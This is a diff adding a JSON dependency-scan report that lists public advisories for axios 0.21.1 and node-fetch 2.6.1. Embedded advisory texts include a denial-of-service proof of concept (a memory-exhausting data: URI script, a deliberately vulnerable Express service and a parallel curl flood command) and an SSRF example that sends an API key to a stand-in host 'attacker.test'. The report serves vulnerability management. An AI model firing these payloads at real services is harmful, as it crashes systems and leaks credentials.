@@ -1,0 +1,694 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/Users/dmytrosamus/Downloads/SBOM/sca-compare/package-lock.json",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "axios",
+            "version": "0.21.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4hjh-wcwx-xvwj"
+              ],
+              "aliases": [
+                "CVE-2025-58754",
+                "GHSA-4hjh-wcwx-xvwj"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-cph5-m8f7-6c5x"
+              ],
+              "aliases": [
+                "CVE-2021-3749",
+                "GHSA-cph5-m8f7-6c5x"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-jr5f-v2jv-69x6"
+              ],
+              "aliases": [
+                "CVE-2025-27152",
+                "GHSA-jr5f-v2jv-69x6"
+              ],
+              "max_severity": "7.7"
+            },
+            {
+              "ids": [
+                "GHSA-wf5p-g6vw-rhxx"
+              ],
+              "aliases": [
+                "CVE-2023-45857",
+                "GHSA-wf5p-g6vw-rhxx"
+              ],
+              "max_severity": "6.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-4hjh-wcwx-xvwj/GHSA-4hjh-wcwx-xvwj.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.0.0"
+                        },
+                        {
+                          "fixed": "1.12.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-4hjh-wcwx-xvwj/GHSA-4hjh-wcwx-xvwj.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.30.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-58754"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-09-11T21:07:55Z",
+                "nvd_published_at": "2025-09-12T02:15:46Z",
+                "severity": "HIGH"
+              },
+              "details": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env \u0026\u0026 config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err =\u003e {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n\u003c--- Last few GCs ---\u003e\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS.\n\n```js\nimport express from \"express\";\nimport morgan from \"morgan\";\nimport axios from \"axios\";\nimport http from \"node:http\";\nimport https from \"node:https\";\nimport { PassThrough } from \"node:stream\";\n\nconst keepAlive = true;\nconst httpAgent = new http.Agent({ keepAlive, maxSockets: 100 });\nconst httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 });\nconst axiosClient = axios.create({\n  timeout: 10000,\n  maxRedirects: 5,\n  httpAgent, httpsAgent,\n  headers: { \"User-Agent\": \"axios-poc-link-preview/0.1 (+node)\" },\n  validateStatus: c =\u003e c \u003e= 200 \u0026\u0026 c \u003c 400\n});\n\nconst app = express();\nconst PORT = Number(process.env.PORT || 8081);\nconst BODY_LIMIT = process.env.MAX_CLIENT_BODY || \"50mb\";\n\napp.use(express.json({ limit: BODY_LIMIT }));\napp.use(morgan(\"combined\"));\n\napp.get(\"/healthz\", (req,res)=\u003eres.send(\"ok\"));\n\n/**\n * POST /preview { \"url\": \"\u003chttp|https|data URL\u003e\" }\n * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector).\n */\n\napp.post(\"/preview\", async (req, res) =\u003e {\n  const url = req.body?.url;\n  if (!url) return res.status(400).json({ error: \"missing url\" });\n\n  let u;\n  try { u = new URL(String(url)); } catch { return res.status(400).json({ error: \"invalid url\" }); }\n\n  // Developer allows using data:// in the allowlist\n  const allowed = new Set([\"http:\", \"https:\", \"data:\"]);\n  if (!allowed.has(u.protocol)) return res.status(400).json({ error: \"unsupported scheme\" });\n\n  const controller = new AbortController();\n  const onClose = () =\u003e controller.abort();\n  res.on(\"close\", onClose);\n\n  const before = process.memoryUsage().heapUsed;\n\n  try {\n    const r = await axiosClient.get(u.toString(), {\n      responseType: \"stream\",\n      maxContentLength: 8 * 1024, // Axios will ignore this for data:\n      maxBodyLength: 8 * 1024,    // Axios will ignore this for data:\n      signal: controller.signal\n    });\n\n    // stream only the first 64KB back\n    const cap = 64 * 1024;\n    let sent = 0;\n    const limiter = new PassThrough();\n    r.data.on(\"data\", (chunk) =\u003e {\n      if (sent + chunk.length \u003e cap) { limiter.end(); r.data.destroy(); }\n      else { sent += chunk.length; limiter.write(chunk); }\n    });\n    r.data.on(\"end\", () =\u003e limiter.end());\n    r.data.on(\"error\", (e) =\u003e limiter.destroy(e));\n\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    limiter.pipe(res);\n  } catch (err) {\n    const after = process.memoryUsage().heapUsed;\n    res.set(\"x-heap-increase-mb\", ((after - before)/1024/1024).toFixed(2));\n    res.status(502).json({ error: String(err?.message || err) });\n  } finally {\n    res.off(\"close\", onClose);\n  }\n});\n\napp.listen(PORT, () =\u003e {\n  console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`);\n  console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`);\n});\n```\nRun this app and send 3 post requests:\n```sh\nSIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString(\"base64\"); process.stdout.write(JSON.stringify({url:\"data:application/octet-stream;base64,\"+b}))' \\\n| tee payload.json \u003e/dev/null\nseq 1 3 | xargs -P3 -I{} curl -sS -X POST \"$URL\" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null```\n```\n\n---\n\n## Suggestions\n\n1. **Enforce size limits**\n   For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",
+              "id": "GHSA-4hjh-wcwx-xvwj",
+              "modified": "2025-09-29T19:03:57Z",
+              "published": "2025-09-11T21:07:55Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58754"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/pull/7011"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/pull/7034"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/a1b1d3f073a988601583a604f5f9f5d05a3d0b67"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/axios/axios"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/releases/tag/v0.30.2"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/releases/tag/v1.12.0"
+                }
+              ],
+              "related": [
+                "CGA-82cq-c7r6-q67x",
+                "CGA-g599-6c37-mmm7",
+                "CGA-jw4w-h92g-894c",
+                "CGA-pvgv-p58w-27vj",
+                "CGA-q8ch-84qh-r7r2",
+                "CVE-2025-58754"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Axios is vulnerable to DoS attack through lack of data size check"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/09/GHSA-cph5-m8f7-6c5x/GHSA-cph5-m8f7-6c5x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.21.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2021-3749"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333",
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2021-09-01T18:14:02Z",
+                "nvd_published_at": "2021-08-31T11:15:00Z",
+                "severity": "HIGH"
+              },
+              "details": "axios before v0.21.2 is vulnerable to Inefficient Regular Expression Complexity.",
+              "id": "GHSA-cph5-m8f7-6c5x",
+              "modified": "2023-11-08T04:06:18.328201Z",
+              "published": "2021-09-01T18:23:02Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3749"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/5b457116e31db0e88fede6c428e969e87f290929"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.oracle.com/security-alerts/cpujul2022.html"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.npmjs.com/package/axios"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/rfc5c478053ff808671aef170f3d9fc9d05cc1fab8fb64431edc66103@%3Ccommits.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/rfa094029c959da0f7c8cd7dc9c4e59d21b03457bf0cedf6c93e1bb0a@%3Cdev.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/rc263bfc5b53afcb7e849605478d73f5556eb0c00d1f912084e407289@%3Ccommits.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/ra15d63c54dc6474b29f72ae4324bcb03038758545b3ab800845de7a1@%3Ccommits.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/r74d0b359408fff31f87445261f0ee13bdfcac7d66f6b8e846face321@%3Ccommits.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/r7324ecc35b8027a51cb6ed629490fcd3b2d7cf01c424746ed5744bf1@%3Ccommits.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/r4bf1b32983f50be00f9752214c1b53738b621be1c2b0dbd68c7f2391@%3Ccommits.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/r3ae6d2654f92c5851bdb73b35e96b0e4e3da39f28ac7a1b15ae3aab8@%3Ccommits.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/r216f0fd0a3833856d6a6a1fada488cadba45f447d87010024328ccf2@%3Ccommits.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread.html/r075d464dce95cd13c03ff9384658edcccd5ab2983b82bfc72b62bb10@%3Ccommits.druid.apache.org%3E"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://huntr.dev/bounties/1e8f07fc-c384-4ff9-8498-0690de2e8c31"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/axios/axios"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "axios Inefficient Regular Expression Complexity vulnerability"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-jr5f-v2jv-69x6/GHSA-jr5f-v2jv-69x6.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.0.0"
+                        },
+                        {
+                          "fixed": "1.8.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-jr5f-v2jv-69x6/GHSA-jr5f-v2jv-69x6.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.30.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-27152"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-918"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-03-07T15:16:00Z",
+                "nvd_published_at": "2025-03-07T16:15:38Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" \u003e /tmp/server1/index.html \necho \"this is server2\" \u003e /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 \u0026\npython -m http.server -d /tmp/server2 10002 \u0026\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",
+              "id": "GHSA-jr5f-v2jv-69x6",
+              "modified": "2025-11-27T08:58:35.129848Z",
+              "published": "2025-03-07T15:16:00Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27152"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/issues/6463"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/pull/6829"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/axios/axios"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/releases/tag/v1.8.2"
+                }
+              ],
+              "related": [
+                "CGA-642h-h99q-qpr5",
+                "CGA-cw47-g5xg-vcxc",
+                "CGA-f8gr-r69c-89fc",
+                "CGA-g7p6-q4mx-2jg4",
+                "CGA-gf4m-xr23-p87v",
+                "CGA-xq8x-44v3-qrv4"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-wf5p-g6vw-rhxx/GHSA-wf5p-g6vw-rhxx.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.0.0"
+                        },
+                        {
+                          "fixed": "1.6.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-wf5p-g6vw-rhxx/GHSA-wf5p-g6vw-rhxx.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "axios",
+                    "purl": "pkg:npm/axios"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0.8.1"
+                        },
+                        {
+                          "fixed": "0.28.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2023-45857"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-352"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2023-11-10T00:35:37Z",
+                "nvd_published_at": "2023-11-08T21:15:08Z",
+                "severity": "MODERATE"
+              },
+              "details": "An issue discovered in Axios 0.8.1 through 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information.",
+              "id": "GHSA-wf5p-g6vw-rhxx",
+              "modified": "2024-06-21T21:33:58Z",
+              "published": "2023-11-08T21:30:37Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45857"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/issues/6006"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/issues/6022"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/pull/6028"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/pull/6091"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/2755df562b9c194fba6d8b609a383443f6a6e967"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/commit/96ee232bd3ee4de2e657333d4d2191cd389e14d0"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/axios/axios"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/releases/tag/v0.28.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/axios/axios/releases/tag/v1.6.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.netapp.com/advisory/ntap-20240621-0006"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.snyk.io/vuln/SNYK-JS-AXIOS-6032459"
+                }
+              ],
+              "related": [
+                "CGA-353m-v97c-f639",
+                "CGA-vgwv-2q7q-27h5"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Axios Cross-Site Request Forgery Vulnerability"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "node-fetch",
+            "version": "2.6.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-r683-j2x4-v87g"
+              ],
+              "aliases": [
+                "CVE-2022-0235",
+                "GHSA-r683-j2x4-v87g"
+              ],
+              "max_severity": "8.8"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-r683-j2x4-v87g/GHSA-r683-j2x4-v87g.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "node-fetch",
+                    "purl": "pkg:npm/node-fetch"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-r683-j2x4-v87g/GHSA-r683-j2x4-v87g.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "node-fetch",
+                    "purl": "pkg:npm/node-fetch"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.6.7"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2022-0235"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-173",
+                  "CWE-200",
+                  "CWE-601"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2022-01-18T22:51:22Z",
+                "nvd_published_at": "2022-01-16T17:15:00Z",
+                "severity": "HIGH"
+              },
+              "details": "node-fetch forwards secure headers such as `authorization`, `www-authenticate`, `cookie`, \u0026 `cookie2` when redirecting to a untrusted site.",
+              "id": "GHSA-r683-j2x4-v87g",
+              "modified": "2023-11-08T04:07:30.211593Z",
+              "published": "2022-01-21T23:55:52Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0235"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/node-fetch/node-fetch/pull/1449/commits/5c32f002fdd65b1c6a8f1e3620210813d45c7e60"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/node-fetch/node-fetch/pull/1453"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/node-fetch/node-fetch/commit/1ef4b560a17e644a02a3bfdea7631ffeee578b35"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/node-fetch/node-fetch/commit/36e47e8a6406185921e4985dcbeff140d73eaa10"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/node-fetch/node-fetch/commit/5c32f002fdd65b1c6a8f1e3620210813d45c7e60"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/node-fetch/node-fetch"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://huntr.dev/bounties/d26ab655-38d6-48b3-be15-f9ad6b6ae6f7"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2022/12/msg00007.html"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "node-fetch forwards secure headers to untrusted sites"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
